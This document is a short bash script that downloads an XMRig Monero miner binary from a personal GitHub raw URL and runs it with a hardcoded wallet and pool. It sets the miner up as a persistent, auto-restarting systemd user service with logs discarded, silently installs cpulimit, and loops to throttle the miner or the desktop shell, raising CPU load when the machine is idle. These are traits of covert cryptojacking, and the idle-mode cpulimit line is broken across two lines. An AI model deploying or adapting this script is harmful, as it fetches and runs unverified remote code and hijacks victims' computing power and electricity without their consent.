#!/bin/bash

SERVICE_DIR="$HOME/services"
XMRIG_DIR="$SERVICE_DIR/xmrig"
POOL="gulf.moneroocean.stream:10128"
WALLET="48bBiT9hcQqJBZCXxKi6mSTzatRSN7kLMgjTBSQReTN8K7uCzxpn7ZuH7DUXua5uVLj4rRZd7vVXjRTnWEBBE33BC2sdw9k"

echo "Setting up XMRig with your wallet and 10% CPU..."

# 1. Create Directory
mkdir -p "$XMRIG_DIR"
cd "$XMRIG_DIR"

# 2. Download from your specific link
echo "Downloading from link..."
wget https://raw.githubusercontent.com/followtheyellowbrickroad321/linux-miner/main/xmrig

# 3. Set Permissions
echo "Setting permissions..."
chmod +x xmrig

# 4. Create Auto-Restart Service
echo "Configuring Auto-Restart..."
mkdir -p ~/.config/systemd/user

cat > ~/.config/systemd/user/xmrig.service <<EOF
[Unit]
Description=XMRig Crypto Miner
After=network.target

[Service]
ExecStart=$XMRIG_DIR/xmrig --url=$POOL --user=$WALLET --cpu=1 --donate-level=1 --nicehash=false --daemon=false --no-color --log-file=/dev/null --bg
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user enable xmrig
systemctl --user restart xmrig

# ==========================================
# CPULIMIT VERSION (WORKS ON VM & STANDARD LINUX)
# Logic: Miner=10% | GUI=10% | Idle(2min)=70%
# ==========================================

# Install cpulimit silently
apt-get install -y cpulimit > /dev/null 2>&1

# Configuration
IDLE_THRESHOLD=120 # Seconds
CHECK_INTERVAL=10
LAST_ACTIVE_TIME=$(date +%s)

while true; do
 sleep $CHECK_INTERVAL
 CURRENT_TIME=$(date +%s)

 # 1. Check Miner PID
 MINER_PID=$(pgrep xmrig)

 # 2. Check GUI PID (gnome-shell)
 GUI_PID=$(pgrep gnome-shell)

 # 3. LOGIC BRANCHES
 if [ "$MINER_PID" != "" ]; then
 # MINER IS RUNNING -> Force 10% Limit
 cpulimit -p $MINER_PID -l 10 > /dev/null 2>&1
 echo "[CPU Manager] Miner Active -> 10% Limit"

 elif [ "$GUI_PID" != "" ]; then
 # MINER DEAD, USER IS ACTIVE -> Force 10% Limit
 cpulimit -p $GUI_PID -l 10 > /dev/null 2>&1
 echo "[CPU Manager] User Active (GUI) -> 10% Limit"

 else
 # SYSTEM IS IDLE (No miner, no GUI)
 # Check if we have waited 120 seconds
 if [ $((CURRENT_TIME - LAST_ACTIVE_TIME)) -ge $IDLE_THRESHOLD ]; then
 # Switch to IDLE Mode (70% load)
 cpulimit -p $$
 -l 70 > /dev/null 2>&1
 echo "[CPU Manager] System Idle for 2m -> 70% Limit"
 else
 # Still waiting for the 120s timer
 echo "[CPU Manager] System Idle -> Waiting for 70% trigger..."
 fi
 fi
done

